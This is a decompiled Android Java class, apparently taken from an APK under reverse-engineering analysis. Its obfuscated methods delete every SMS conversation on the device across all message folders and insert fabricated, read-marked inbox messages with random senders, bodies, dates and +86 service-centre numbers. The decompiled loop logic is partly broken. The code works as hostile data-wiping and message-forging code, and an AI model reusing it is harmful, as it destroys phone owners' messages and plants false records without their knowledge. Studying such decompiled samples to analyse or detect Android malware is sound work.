package com.soft.tools.messageAndContacts;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import java.util.Random;

public final class h
{
  public static void a(Context paramContext)
  {
    String[] arrayOfString = new String[6];
    arrayOfString[0] = "content://sms/inbox";
    arrayOfString[1] = "content://sms/sent";
    arrayOfString[2] = "content://sms/outbox";
    arrayOfString[3] = "content://sms/draft";
    arrayOfString[4] = "content://sms/failed";
    arrayOfString[5] = "content://sms/undelivered";
    int j = arrayOfString.length;
    int i = 0;
    if (i >= j) {
      return;
    }
    Object localObject = arrayOfString[i];
    localObject = paramContext.getContentResolver().query(Uri.parse((String)localObject), null, null, null, null);
    for (;;)
    {
      if (!((Cursor)localObject).moveToNext())
      {
        i += 1;
        break;
      }
      String str = "content://sms/conversations/" + ((Cursor)localObject).getString(1);
      paramContext.getContentResolver().delete(Uri.parse(str), null, null);
    }
  }
  
  public static void b(Context paramContext)
  {
    int i = (int)(10.0D * Math.random());
    Object localObject1 = new Random();
    if (i + 5 <= 0)
    {
      Log.i("Tag_ApkArtifact", "------SmsUtil randomSms------");
      return;
    }
    int j = (int)(20.0D * Math.random());
    Object localObject2 = new StringBuffer();
    i = 0;
    for (;;)
    {
      if (i >= j + 10)
      {
        localObject1 = b.b[((int)(Math.random() * b.b.length))] + ((int)(Math.random() * 89999999.0D) + 10000000);
        String str = b.b[((int)(Math.random() * b.b.length))] + ((int)(Math.random() * 89999999.0D) + 10000000);
        long l = Long.valueOf(a.a() + (int)(a.b * Math.random()) + String.valueOf("000")).longValue();
        localObject2 = ((StringBuffer)localObject2).toString();
        ContentValues localContentValues = new ContentValues();
        localContentValues.put("address", (String)localObject1);
        localContentValues.put("body", (String)localObject2);
        localContentValues.put("date", Long.valueOf(l));
        localContentValues.put("read", Integer.valueOf(1));
        i = (int)(5.0D * Math.random());
        localContentValues.put("type", Integer.valueOf(new int[] { 1, 2, 1, 1, 2 }[i]));
        localContentValues.put("service_center", "+86" + str);
        paramContext.getContentResolver().insert(Uri.parse("content://sms/inbox"), localContentValues);
        return;
      }
      ((StringBuffer)localObject2).append(b.a.charAt(((Random)localObject1).nextInt(b.a.length())));
      i += 1;
    }
  }
}



/* Location:           D:\AndroidKiller_v1.3.1\projects\008\ProjectSrc\smali\

 * Qualified Name:     com.soft.tools.messageAndContacts.runningserviceinfolist

 * JD-Core Version:    0.7.0.1

 */